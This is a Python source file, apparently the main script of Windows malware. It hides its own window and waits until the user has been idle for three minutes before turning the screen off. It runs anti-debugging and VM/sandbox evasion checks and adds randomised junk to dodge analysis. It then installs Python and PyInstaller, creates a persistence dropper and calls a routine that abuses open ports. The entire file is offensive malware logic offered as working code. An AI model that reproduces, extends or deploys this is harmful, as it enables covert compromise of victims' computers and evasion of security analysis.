import sys
from time import sleep
from hashlib import sha512
from Persistance.foothold import get_pyinstaller,install_python,create_dropper
from Utils.helpers import is_python_exist,is_online,find_python_path
from threading import Thread
from Evasion import debugEvasion,vmDetect
from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
from Exploitation.common import abuse_open_ports
from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
from random import randrange,choice
import win32gui, win32con
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
#//TODO: instead of sys.exit. spawn subprocess to delete the whole thing before.
def main():
    Thread(target=debugEvasion.process_monitor,args=()).start()
    debug = False #if true -- vm evasion will result only in printing!
    if len(sys.argv) > 0:
        try:
            if sha512(sys.argv[1].encode()).hexdigest() == 'd983a2437d298f8c263ad51604d4c49dba2fe7a2ec81419f404931caf9d1b0bc2031373b2a731e00e6ebdbfac446b757be0cf7101ae852cc9fd45e42c80fb102':
                debug = True
        except Exception as e:
            pass
    vm_flag = sys.exit if not debug else lambda x: print(x)
    prevent_sleep()
    if not debug :
        while get_idle_duration() < 180:
            sleep(180)
    if not debug:
        turn_screen_off()
    """
    if we are here, get_idle_duration is higher than 180. so user didn't touched anything for 180 seconds atleast
    we run prevent sleep to prevent the pc from actually sleeping
    we make the screen black
    and we start!
    """
    if any([not vmDetect.is_enough_ram(),not vmDetect.is_enough_disk(), not vmDetect.is_enough_cores()]):
        vm_flag("EXITED ON ANY_SPEC CHECK") #Stop exec if we suspect that's vm/sandbox by resource check
    #//TODO: add doc
    if not is_online():
        vm_flag('NOT ONLINE') #another vm evade check
    if debugEvasion.find_debug_process():
        vm_flag("we found debug process") # stop exec if we have debug process somewhere
    if not is_normal_browser_user():
        vm_flag("not a normal browser user")
    if vmDetect.detect_vm_by_wmi():
        vm_flag("detected vm by wmi") #another vm evade
        #we do the detect_vm as last check as this is noisy AF
    ALLOC_RANDOM = randrange(1 , 10)
    if ALLOC_RANDOM > 6:
        x = choice([random_base64,random_byte,random_a85,random_list])()
        #we have chance of 30% to get here, and if we get here, we choose from 4 functions
        # each of this functions have 50% chance to return something else.
        #random it is.
    if not is_python_exist():
        install_python()

    pythonPath = find_python_path()
    if get_pyinstaller(pythonPath):
        #WE INSTALLED PYINSTALLER, POSSIBLY COMPILING
        #//TODO 35: FIND A WAY TO CHECK IF WE COMPILED THE BOOTLOADER
        #what next?
        pass
    create_dropper() #in the end, when we installed everything --> we create dropper
    abuse_open_ports()
    return


if __name__ == "__main__":
    main()